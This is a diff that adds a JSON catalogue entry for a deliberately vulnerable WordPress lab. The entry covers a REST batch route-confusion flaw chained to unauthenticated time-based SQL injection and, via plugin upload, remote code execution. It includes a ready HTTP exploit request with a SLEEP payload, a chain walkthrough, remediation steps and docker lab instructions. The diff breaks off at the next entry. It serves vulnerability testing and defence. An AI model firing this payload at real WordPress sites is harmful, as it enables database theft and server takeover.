@@ -1,5 +1,91 @@
 [
   {
+    "id": "vt-2026-63030",
+    "info": {
+      "name": "WordPress Core - REST Batch Route Confusion to SQLi (wp2shell)",
+      "author": "omarkurt",
+      "description": "WordPress Core 6.9.0-6.9.4 and 7.0.0-7.0.1 are affected by a REST API batch\nendpoint route/validation desynchronization (CVE-2026-63030). A malformed\nsub-request shifts parallel $matches/$validation arrays so a request object\ncan be dispatched with another route's handler, bypassing allow_batch and\nschema sanitization. Chained with scalar author__not_in handling in WP_Query\n(CVE-2026-60137), unauthenticated attackers can perform time-based SQL\ninjection, recover credential hashes, and with cracked admin credentials\ninstall a plugin for RCE (wp2shell chain). Fixed in 6.9.5 and 7.0.2.\n",
+      "type": "CVE",
+      "targets": [
+        "wordpress"
+      ],
+      "cve": "CVE-2026-63030",
+      "cwe": "CWE-89",
+      "cvss": {
+        "score": 9.8,
+        "severity": "critical",
+        "metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "affected_versions": [
+        "WordPress 6.9.0 - 6.9.4",
+        "WordPress 7.0.0 - 7.0.1"
+      ],
+      "fixed_version": "6.9.5 / 7.0.2",
+      "tags": [
+        "sqli",
+        "rce",
+        "unauthenticated",
+        "wordpress",
+        "rest-api",
+        "batch",
+        "wp2shell",
+        "cve-2026",
+        "cve-2026-63030",
+        "cve-2026-60137"
+      ],
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-63030",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-60137",
+        "https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q",
+        "https://wordpress.org/news/2026/07/wordpress-7-0-2-release/",
+        "https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core/",
+        "https://blog.zsec.uk/wp2shell-code-trace-deep-dive/"
+      ]
+    },
+    "vulnerabilities": [
+      {
+        "id": "batch_route_confusion_sqli",
+        "name": "Unauth REST batch route confusion to author__not_in SQLi",
+        "description": "POST /wp-json/batch/v1 accepts nested sub-requests. A malformed path\n(e.g. http://:) becomes WP_Error and, on vulnerable builds, is appended\nonly to $validation (not $matches). Indices desynchronize so a categories\nrequest carrying scalar author_exclude can execute under the posts\ncollection handler, mapping into author__not_in without absint/schema\ncoercion and injecting into NOT IN (...).\n",
+        "endpoint": "/wp-json/batch/v1",
+        "method": "POST",
+        "param": "author_exclude",
+        "request": "POST /?rest_route=/batch/v1 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nContent-Length: 512\n\n{\"requests\":[{\"method\":\"POST\",\"path\":\"http://:\"},{\"method\":\"POST\",\"path\":\"/wp/v2/posts\",\"body\":{\"requests\":[{\"method\":\"GET\",\"path\":\"http://:\"},{\"method\":\"GET\",\"path\":\"/wp/v2/categories?author_exclude=SELECT%20IF((1%3d1),SLEEP(3),0)\"},{\"method\":\"GET\",\"path\":\"/wp/v2/posts\"}]}},{\"method\":\"POST\",\"path\":\"/batch/v1\"}]}\n",
+        "response": "HTTP/1.1 207 Multi-Status\nContent-Type: application/json\n\n(HTTP response delayed ~3s when time-based SQLi fires; structure may vary)\n"
+      }
+    ],
+    "technical": "Three related boundaries are involved (fixed together in 7.0.2 / 6.9.5):\n\n1) Batch desync (CVE-2026-63030) \u2014 wp-includes/rest-api/class-wp-rest-server.php\n   serve_batch_request_v1(): for is_wp_error($single_request), vulnerable code\n   only did $validation[] = $error and continue, without $matches[] = $error.\n   Execution still indexes $matches[$i] against $requests[$i], pairing the wrong\n   handler with request parameters. allow_batch can also be evaluated for the\n   wrong route.\n\n2) Posts mapping \u2014 class-wp-rest-posts-controller.php maps author_exclude ->\n   author__not_in. get_items_permissions_check allows unauthenticated view\n   context. Schema normally forces integer arrays; confused dispatch skips it.\n\n3) SQL sink (CVE-2026-60137) \u2014 class-wp-query.php author__not_in: only arrays\n   received array_map(absint, ...); scalars were implode'd into\n   post_author NOT IN ($value) without coercion.\n\nPatch 7.0.2: align $matches on errors; is_dispatching() re-entry guards;\nwp_parse_id_list() at the SQL sink.\n\nFull RCE (wp2shell) is a post-exploitation chain: blind SQLi -> admin hash ->\noffline crack -> authenticated plugin upload -> direct PHP request. Lab focuses\non the unauth SQLi trigger; install_plugins + writable plugins dir enable the\noptional second stage with known weak credentials.\n",
+    "impact": "Unauthenticated SQL injection can disclose database contents including\npassword hashes. With a recoverable admin password and plugin install\ncapability, attackers can achieve remote code execution as the PHP worker\n(typically www-data). Affects default WordPress installations with REST\nenabled on vulnerable versions.\n",
+    "remediation": [
+      "Upgrade WordPress to 7.0.2 or later (or 6.9.5 on the 6.9 branch)",
+      "Block or rate-limit POST to /wp-json/batch/v1 and /?rest_route=/batch/v1",
+      "WAF: detect nested batch requests with malformed paths (http://:) and author_exclude SQL fragments",
+      "Enforce strong admin passwords; enable DISALLOW_FILE_MODS where plugins must not be uploaded",
+      "Monitor for bursts of batch requests with elevated response latency (time-based SQLi)"
+    ],
+    "poc": {
+      "nuclei": [
+        "vt-2026-63030.nuclei.yaml"
+      ]
+    },
+    "providers": {
+      "docker-compose": {
+        "path": "docker-compose.yaml"
+      }
+    },
+    "post-install": [
+      "docker compose pull  # pulls ghcr.io/happyhackingspace/vt-2026-63030:latest",
+      "docker compose up -d && wait for healthy (first boot ~60-90s install)",
+      "App: http://localhost:8630  (admin / AdminPass!234)",
+      "REST batch: POST http://localhost:8630/?rest_route=/batch/v1",
+      "nuclei -t vt-2026-63030.nuclei.yaml -u http://localhost:8630",
+      "Image: https://github.com/orgs/HappyHackingSpace/packages/container/package/vt-2026-63030",
+      "Patched negative control: wordpress:7.0.2 should not time-delay on the SQLi probe"
+    ],
+    "category": "cves",
+    "added_date": "2026-07-18T16:24:08+03:00"
+  },
+  {
     "id": "vt-2026-1492",
     "info": {
       "name": "WordPress User Registration & Membership - Unauthenticated Privilege Escalation",
